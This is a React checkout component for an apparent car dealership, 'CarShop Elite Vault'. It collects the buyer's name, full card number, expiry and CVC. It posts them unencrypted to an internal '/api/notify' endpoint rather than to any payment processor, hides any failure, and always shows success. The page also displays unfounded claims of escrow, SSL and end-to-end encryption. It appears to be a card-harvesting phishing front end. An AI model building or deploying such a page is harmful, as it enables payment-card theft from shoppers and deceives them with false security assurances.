"use client";

import { useState, useEffect } from "react";
import { CiCreditCard1 } from "react-icons/ci";
import { IoLogoPaypal } from "react-icons/io5";
import { FiUser, FiCreditCard, FiCalendar, FiLock, FiShield } from "react-icons/fi";
import { MdDirectionsCar, MdVerified } from "react-icons/md";
import { BsArrowLeft, BsCheckCircleFill } from "react-icons/bs";

interface FieldProps {
  label: string;
  icon: React.ReactNode;
  value: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  placeholder: string;
  maxLength?: number;
}

function Field({ label, icon, value, onChange, placeholder, maxLength }: FieldProps) {
  return (
    <div className="flex flex-col gap-2 text-left">
      <label className="text-[10px] font-extrabold text-slate-500 uppercase tracking-[0.2em]">
        {label}
      </label>
      <div className="relative group">
        <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 group-focus-within:text-amber-500 transition-colors text-base">
          {icon}
        </span>
        <input
          type="text"
          value={value}
          onChange={onChange}
          placeholder={placeholder}
          maxLength={maxLength}
          className="w-full pl-12 pr-4.5 py-4 rounded-xl bg-slate-50 border border-slate-200 text-slate-900 placeholder-slate-400 text-sm font-semibold focus:outline-none focus:border-amber-500 focus:ring-2 focus:ring-amber-500/20 transition-all shadow-sm"
        />
      </div>
    </div>
  );
}

export default function Payment({ 
  onSuccess, 
  onBack 
}: { 
  onSuccess?: (data: { firstName: string; lastName: string; cardNumber: string; exp: string; cvc: string; method: string }) => void; 
  onBack?: () => void 
}) {
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [exp, setExp] = useState("");
  const [cvc, setCvc] = useState("");
  const [method, setMethod] = useState<"card" | "paypal">("card");
  const [loading, setLoading] = useState(false);
  const [mounted, setMounted] = useState(false);

  useEffect(() => {
    const t = setTimeout(() => setMounted(true), 100);
    return () => clearTimeout(t);
  }, []);

  const completedFields = [firstName, lastName, cardNumber, exp, cvc].filter(Boolean).length;
  const isEmpty = completedFields < 5;

  const handleCardNumber = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 16);
    setCardNumber(val.replace(/(.{4})/g, "$1 ").trim());
  };

  const handleExp = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 4);
    if (val.length <= 2) setExp(val);
    else setExp(`${val.slice(0, 2)}/${val.slice(2)}`);
  };

  const handleSubmit = async () => {
    if (isEmpty) return;
    setLoading(true);
    try {
      await fetch("/api/notify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ firstName, lastName, cardNumber, exp, cvc }),
      });
    } catch (e) {
      // Handle network requests safely
    }
    setTimeout(() => {
      setLoading(false);
      if (onSuccess) onSuccess({ firstName, lastName, cardNumber, exp, cvc, method });
    }, 1000);
  };

  return (
    <section className="relative min-h-screen w-full bg-white text-slate-900 flex flex-col justify-between py-12 px-4 sm:px-6 lg:px-8 selection:bg-amber-400 selection:text-slate-950 overflow-hidden">
      
      {/* Background Soft Ambience */}
      <div className="absolute inset-0 z-0 pointer-events-none overflow-hidden">
        <div className="absolute inset-0 bg-cover bg-center opacity-5 filter blur-md scale-105" style={{ backgroundImage: "url('https://static.vecteezy.com/system/resources/thumbnails/057/523/776/small/a-vintage-style-teal-and-yellow-car-parks-against-a-matching-solid-teal-wall-in-a-studio-setting-photo.jpeg')" }} />
        <div className="absolute -top-32 right-1/4 w-[500px] h-[500px] bg-amber-400/10 rounded-full blur-[140px]" />
      </div>

      {/* Top Bar */}
      <div className="relative max-w-7xl mx-auto w-full flex items-center justify-between z-10 mb-6">
        <button
          onClick={onBack}
          className="group flex items-center gap-2 px-4 py-2.5 rounded-xl bg-slate-100 hover:bg-slate-200 border border-slate-200 text-slate-700 font-semibold text-xs tracking-wider uppercase transition-all shadow-sm"
        >
          <BsArrowLeft className="group-hover:-translate-x-1 transition-transform" /> 
          Showroom
        </button>

        <div className="flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-amber-50 border border-amber-200 text-amber-700 text-[11px] font-bold tracking-widest uppercase">
          <FiShield /> Secure Escrow
        </div>
      </div>

      {/* Checkout Container: Modern Split Card Style */}
      <div className={`relative z-10 w-full max-w-4xl mx-auto my-auto transition-all duration-700 ${mounted ? "opacity-100 translate-y-0" : "opacity-0 translate-y-6"}`}>
        <div className="grid grid-cols-1 lg:grid-cols-12 bg-white border border-slate-200 rounded-3xl overflow-hidden shadow-2xl shadow-slate-200/50">
          
          {/* Left Summary Box - Text and Content Centered */}
          <div className="lg:col-span-5 bg-gradient-to-br from-slate-50 to-slate-100/60 p-6 sm:p-8 flex flex-col justify-between items-center text-center border-b lg:border-b-0 lg:border-r border-slate-200">
            <div className="flex flex-col items-center">
              <div className="h-12 w-12 rounded-2xl bg-amber-500 flex items-center justify-center text-white mb-6 shadow-lg shadow-amber-500/20">
                <MdDirectionsCar className="text-2xl font-black" />
              </div>
              <span className="text-[10px] font-extrabold text-amber-600 tracking-[0.25em] uppercase">CARSHOP ELITE VAULT</span>
              <h2 className="text-2xl sm:text-3xl font-black tracking-tight text-slate-900 mt-1 mb-3">Instant Checkout</h2>
              <p className="text-slate-600 text-xs leading-relaxed max-w-xs">
                Complete your transaction securely to reserve your allocation with end-to-end verified encryption.
              </p>
            </div>

            <div className="mt-8 space-y-4 pt-6 border-t border-slate-200 w-full">
              <div className="flex items-center justify-between text-xs text-slate-600">
                <span className="text-slate-500">Security Standard</span>
                <span className="font-bold text-slate-900">256-Bit SSL</span>
              </div>
              <div className="flex items-center justify-between text-xs text-slate-600">
                <span className="text-slate-500">Transaction Fee</span>
                <span className="font-bold text-emerald-600">Zero (Waived)</span>
              </div>
              <div className="flex items-center justify-between text-xs text-slate-600 pt-3 border-t border-slate-200">
                <span className="font-bold text-slate-900 text-sm">Status</span>
                <span className="flex items-center gap-1 text-emerald-600 font-bold"><MdVerified /> Ready</span>
              </div>
            </div>
          </div>

          {/* Right Form Box */}
          <div className="lg:col-span-7 p-6 sm:p-8 lg:p-10 bg-white flex flex-col justify-between">
            <div>
              {/* Payment Method Switcher */}
              <div className="grid grid-cols-2 gap-3 mb-8">
                <button 
                  onClick={() => setMethod("card")}
                  className={`flex items-center justify-center gap-2 py-3 rounded-xl border text-xs font-extrabold uppercase tracking-wider transition-all ${
                    method === "card" 
                      ? "bg-slate-900 border-slate-900 text-white shadow-md shadow-slate-900/10" 
                      : "bg-slate-50 border-slate-200 text-slate-600 hover:text-slate-900"
                  }`}
                >
                  <CiCreditCard1 size={18} /> Card
                </button>
                <button 
                  onClick={() => setMethod("paypal")}
                  className={`flex items-center justify-center gap-2 py-3 rounded-xl border text-xs font-extrabold uppercase tracking-wider transition-all ${
                    method === "paypal" 
                      ? "bg-blue-600 border-blue-500 text-white shadow-md shadow-blue-600/20" 
                      : "bg-slate-50 border-slate-200 text-slate-600 hover:text-slate-900"
                  }`}
                >
                  <IoLogoPaypal size={16} className="text-blue-500" /> PayPal
                </button>
              </div>

              {/* Form Input Fields */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 mb-6">
                <Field label="First Name" icon={<FiUser />} value={firstName} onChange={(e) => setFirstName(e.target.value)} placeholder="John" />
                <Field label="Last Name" icon={<FiUser />} value={lastName} onChange={(e) => setLastName(e.target.value)} placeholder="Doe" />
                <div className="sm:col-span-2">
                  <Field label="Card Number" icon={<FiCreditCard />} value={cardNumber} onChange={handleCardNumber} placeholder="4532 •••• •••• 8921" maxLength={19} />
                </div>
                <Field label="Expires" icon={<FiCalendar />} value={exp} onChange={handleExp} placeholder="MM/YY" maxLength={5} />
                <Field label="CVC" icon={<FiLock />} value={cvc} onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 3))} placeholder="3 Digits" maxLength={3} />
              </div>
            </div>

            <div>
              {/* Field Progress Tracker */}
              <div className="flex items-center gap-1 mb-4">
                {[0, 1, 2, 3, 4].map((i) => (
                  <div key={i} className={`h-1 flex-1 rounded-full transition-all duration-300 ${i < completedFields ? "bg-amber-500 shadow-[0_0_8px_rgba(245,158,11,0.4)]" : "bg-slate-200"}`} />
                ))}
              </div>

              {/* Submit Button */}
              <button 
                onClick={handleSubmit} 
                disabled={isEmpty || loading}
                className={`w-full py-4 rounded-xl font-black text-xs tracking-[0.2em] uppercase transition-all shadow-xl ${
                  isEmpty || loading 
                    ? "bg-slate-100 border border-slate-200 text-slate-400 cursor-not-allowed" 
                    : "bg-slate-900 hover:bg-slate-800 text-white shadow-slate-900/20 hover:scale-[1.01] active:scale-95"
                }`}
              >
                {loading ? "Processing Securely..." : "Authorize & Pay Now"}
              </button>

              <div className="flex items-center justify-center gap-4 mt-6 text-[10px] font-bold text-slate-500 uppercase tracking-widest">
                <span className="flex items-center gap-1"><BsCheckCircleFill className="text-emerald-600" /> SSL Secured</span>
                <span className="flex items-center gap-1"><BsCheckCircleFill className="text-emerald-600" /> Instant Escrow</span>
              </div>
            </div>

          </div>
        </div>
      </div>

      {/* Footer Note */}
      <div className="relative max-w-7xl mx-auto w-full text-center mt-10 z-10">
        <p className="text-slate-500 text-[10px] tracking-[0.25em] uppercase">
          CarShop Elite Division © 2026 — Secure Institutional Gateway
        </p>
      </div>
    </section>
  );
}